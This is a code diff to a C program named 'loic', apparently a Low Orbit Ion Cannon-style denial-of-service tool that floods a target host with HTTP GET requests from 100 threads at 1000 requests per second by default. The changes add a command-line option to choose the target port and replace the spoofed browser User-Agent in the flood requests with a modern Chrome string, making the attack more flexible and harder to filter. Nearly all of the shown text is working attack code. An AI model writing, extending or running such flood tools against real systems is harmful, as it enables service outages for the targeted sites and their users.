@@ -18,14 +18,15 @@ volatile unsigned long long send_count;
 volatile unsigned long long recv_count;
 volatile unsigned long long restart_count;
 
-void setupinfo(char* host) {
+void setupinfo(char* host, char* port) {
 	struct addrinfo hints;
 
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 
-	getaddrinfo(host, "80", &hints, &info);
+	//getaddrinfo(host, "80", &hints, &info);
+	getaddrinfo(host, port, &hints, &info);
 }
 
 struct message {
@@ -45,7 +46,7 @@ void setup_messages() {
 		char* m = malloc(500 * sizeof(char));
 		int l;
 
-		l = sprintf(m, "GET / HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT %s; %s; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17\r\nAccept: */*\r\n\r\n", lang[rand() % 6], versions[rand() % 3]);
+		l = sprintf(m, "GET / HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\r\nAccept: */*\r\n\r\n", lang[rand() % 6], versions[rand() % 3]);
 
 		messages[i].m = m;
 		messages[i].len = l;
@@ -91,15 +92,17 @@ void* loop(void* data) {
 }
 
 void usage() {
-	printf("usage: loic [-h] [-r rate] [-t threads] host\n");
+	printf("usage: loic [-h] [-r rate] [-t threads] [-p portNo] host\n");
 }
 
 int main(int argc, char **argv)
 {
 	int num_threads = 100;
 	int rate = 1000;
+	char *port = "80";
 	
 	struct option long_options[] = {
+		{"port",    required_argument, 0, 'p'},
 		{"threads", required_argument, 0, 't'},
 		{"rate",    required_argument, 0, 'r'},
 		{"help",    no_argument,       0, 'h'},
@@ -109,8 +112,11 @@ int main(int argc, char **argv)
 	int c;
 	int option_index = 0;
 
-	while((c = getopt_long(argc, argv, "ht:r:", long_options, &option_index)) != -1) {
+	while((c = getopt_long(argc, argv, "ht:r:p:", long_options, &option_index)) != -1) {
 		switch(c) {
+			case 'p':
+				port = (optarg);
+				break;
 			case 't':
 				num_threads = atoi(optarg);
 				break;
@@ -123,7 +129,9 @@ int main(int argc, char **argv)
 				printf("  -r, --rate:    modify requests per second\n"
 				       "                 default: 1000\n"
 				       "  -t, --threads: modify the number of threads\n"
-				       "                 default: 100\n");
+				       "                 default: 100\n"
+				       "  -p, --port: port number on target\n"
+				       "                 default: 80\n");
 				return 0;
 			default:
 				usage();
@@ -150,7 +158,7 @@ int main(int argc, char **argv)
 
 	setup_messages();
 
-	setupinfo(argv[optind]);
+	setupinfo(argv[optind],port);
 
 	for(i=0; i<num_threads; ++i) {
 		pthread_create(&threads[i], NULL, loop, &done);
